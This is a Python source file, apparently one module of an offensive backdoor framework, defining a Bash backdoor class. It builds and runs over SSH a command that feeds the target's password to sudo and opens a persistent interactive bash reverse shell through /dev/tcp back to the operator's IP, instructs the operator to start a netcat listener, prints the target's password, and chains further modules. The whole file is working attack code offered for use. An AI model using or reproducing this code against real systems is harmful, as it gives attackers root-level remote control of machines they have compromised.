from backdoor import *

class Bash(Backdoor):
    prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Bash backdoor..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
        
        self.enabled_modules = {}
        self.modules = {} 
        self.allow_modules = True

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")

    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        raw_input(INFO + "Please create a listener with the command nc -v -n -l -p " + str(port))
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + target.pword)
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit(self.get_command())

